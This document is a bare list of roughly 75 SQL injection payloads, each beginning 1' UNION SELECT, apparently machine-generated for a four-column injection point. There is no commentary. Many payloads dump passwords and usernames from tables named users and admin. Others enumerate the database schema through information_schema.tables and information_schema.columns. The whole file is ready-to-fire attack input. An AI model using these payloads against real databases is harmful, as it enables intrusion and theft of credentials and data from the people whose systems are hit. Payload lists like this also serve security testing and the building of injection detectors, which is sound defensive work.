1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT INDEX_LENGTH ,NULL ,TABLE_CATALOG ,VERSION FROM information_schema.tables WHERE TABLE_ROWS ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT NUMERIC_SCALE ,SRS_ID ,COLUMN_NAME ,TABLE_NAME FROM information_schema.columns WHERE COLUMN_TYPE <>'
1' UNION SELECT NUMERIC_PRECISION ,SRS_ID ,COLUMN_KEY ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE COLUMN_NAME <>'
1' UNION SELECT TABLE_SCHEMA ,COLUMN_COMMENT ,CHARACTER_SET_NAME ,TABLE_NAME FROM information_schema.columns WHERE NUMERIC_PRECISION <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT type ,NULL ,price ,type FROM products WHERE type ='1
1' UNION SELECT NULL ,password ,NULL ,id FROM users WHERE password ='1
1' UNION SELECT AUTO_INCREMENT ,VERSION ,CHECKSUM ,ROW_FORMAT FROM information_schema.tables WHERE CHECKSUM ='1
1' UNION SELECT AVG_ROW_LENGTH ,TABLE_TYPE ,CHECKSUM ,TABLE_CATALOG FROM information_schema.tables WHERE CREATE_OPTIONS ='1
1' UNION SELECT NULL ,comment ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,password ,NULL ,NULL FROM users WHERE id ='1
1' UNION SELECT NULL ,CHECKSUM ,DATA_LENGTH ,CREATE_TIME FROM information_schema.tables WHERE CREATE_TIME ='1
1' UNION SELECT password ,id ,password ,password FROM admin WHERE username ='1
1' UNION SELECT NULL ,username ,username ,NULL FROM admin WHERE id ='1
1' UNION SELECT name ,NULL ,name ,name FROM commentsnew WHERE name <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT type ,NULL ,id ,name FROM products WHERE id ='1
1' UNION SELECT password ,password ,NULL ,username FROM users WHERE id ='1
1' UNION SELECT id ,NULL ,NULL ,password FROM admin WHERE id <>'
1' UNION SELECT name ,name ,NULL ,name FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT description ,NULL ,name ,NULL FROM types WHERE id <>'
1' UNION SELECT TABLE_COMMENT ,CREATE_OPTIONS ,TABLE_NAME ,TABLE_COMMENT FROM information_schema.tables WHERE TABLE_COLLATION <>'
1' UNION SELECT id ,id ,id ,name FROM types WHERE description ='1
1' UNION SELECT NULL ,id ,username ,username FROM users WHERE id ='1
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,price ,price ,NULL FROM products WHERE name ='1
1' UNION SELECT COLUMN_NAME ,COLUMN_COMMENT ,COLUMN_KEY ,EXTRA FROM information_schema.columns WHERE SRS_ID <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT DATETIME_PRECISION ,COLUMN_TYPE ,COLUMN_TYPE ,TABLE_SCHEMA FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT id ,id ,password ,password FROM admin WHERE password ='1
1' UNION SELECT ORDINAL_POSITION ,TABLE_NAME ,DATETIME_PRECISION ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT description ,id ,name ,NULL FROM types WHERE name <>'
1' UNION SELECT password ,id ,NULL ,password FROM admin WHERE username ='1
1' UNION SELECT DATETIME_PRECISION ,COLLATION_NAME ,CHARACTER_OCTET_LENGTH ,EXTRA FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT NULL ,comment ,name ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT id ,password ,NULL ,id FROM users WHERE username <>'
1' UNION SELECT NULL ,NULL ,password ,NULL FROM users WHERE username ='1
1' UNION SELECT NULL ,SRS_ID ,NULL ,SRS_ID FROM information_schema.columns WHERE COLUMN_KEY <>'
1' UNION SELECT username ,id ,username ,id FROM admin WHERE id <>'
1' UNION SELECT description ,name ,description ,id FROM types WHERE description <>'
1' UNION SELECT name ,name ,type ,type FROM products WHERE price ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT username ,username ,id ,NULL FROM admin WHERE id <>'
1' UNION SELECT name ,id ,NULL ,id FROM types WHERE id ='1
1' UNION SELECT id ,username ,NULL ,NULL FROM admin WHERE username <>'
1' UNION SELECT password ,username ,username ,NULL FROM admin WHERE username <>'
1' UNION SELECT NULL ,id ,password ,NULL FROM admin WHERE username ='1
1' UNION SELECT NULL ,password ,NULL ,username FROM users WHERE username <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT type ,name ,NULL ,id FROM products WHERE type ='1
1' UNION SELECT IS_NULLABLE ,NUMERIC_PRECISION ,NULL ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE ORDINAL_POSITION ='1
1' UNION SELECT id ,id ,NULL ,username FROM admin WHERE password <>'
1' UNION SELECT CREATE_OPTIONS ,TABLE_TYPE ,CHECK_TIME ,ROW_FORMAT FROM information_schema.tables WHERE CREATE_OPTIONS <>'
1' UNION SELECT id ,NULL ,NULL ,NULL FROM products WHERE name ='1
1' UNION SELECT name ,NULL ,id ,NULL FROM types WHERE description <>'
1' UNION SELECT NULL ,description ,name ,name FROM types WHERE description ='1
1' UNION SELECT TABLE_CATALOG ,TABLE_SCHEMA ,ROW_FORMAT ,INDEX_LENGTH FROM information_schema.tables WHERE UPDATE_TIME ='1
1' UNION SELECT id ,id ,NULL ,id FROM admin WHERE id <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,id ,username ,username FROM users WHERE username <>'
1' UNION SELECT VERSION ,TABLE_CATALOG ,NULL ,NULL FROM information_schema.tables WHERE TABLE_SCHEMA <>'
1' UNION SELECT name ,comment ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT name ,description ,id ,NULL FROM types WHERE id ='1
1' UNION SELECT DATETIME_PRECISION ,CHARACTER_SET_NAME ,COLUMN_DEFAULT ,COLUMN_TYPE FROM information_schema.columns WHERE ORDINAL_POSITION ='1
1' UNION SELECT name ,id ,id ,NULL FROM types WHERE name ='1
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT description ,NULL ,id ,name FROM types WHERE id ='1
1' UNION SELECT name ,description ,id ,id FROM types WHERE id <>'
